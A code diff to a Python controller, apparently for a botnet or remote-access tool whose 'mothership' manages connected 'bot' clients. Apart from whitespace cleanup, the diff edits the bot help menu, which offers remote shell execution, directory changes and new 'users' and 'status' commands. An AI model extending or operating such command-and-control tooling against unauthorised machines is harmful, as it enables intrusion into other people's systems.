@@ -181,7 +181,7 @@ def userlist(conn):
 
 
 def remove(connection):
-    
+
     if connection in list_of_clientsocket:
         x=list_of_clientsocket.index(connection)
         list_of_clientsocket.pop(x)
@@ -401,22 +401,10 @@ def quitsafely():
             sys.stdout.flush()
             time.sleep(1)
         print(Style.RESET_ALL)
-        
-        
-        
-        
         exit()
         sys.exit()
-            
-        
-     
     else:
         return
-        
-        
-        
-        
-        
 
 def graphics():
 
@@ -470,7 +458,7 @@ def helpbot():
     print("+-------------------+--------------------------------------------------------+")
     print("|        help       | see this table                                         |")
     print("+-------------------+--------------------------------------------------------+")
-    print("|     screenshot    | take a screenshot of bot and save to cwd of mothership |")
+    print("|        users      | get list of users on the remote system                 |")
     print("+-------------------+--------------------------------------------------------+")
     print("|  shell*<command>  | execute a shell command on bot                         |")
     print("+-------------------+--------------------------------------------------------+")
@@ -480,7 +468,8 @@ def helpbot():
     print("+-------------------+--------------------------------------------------------+")
     print("|     cd*<path>     | change cwd of bot                                      |")
     print("+-------------------+--------------------------------------------------------+")
-    
+    print("|     status        | get os memory and cpu statistics of remote client      |")
+    print("+-------------------+--------------------------------------------------------+")
     
 
 
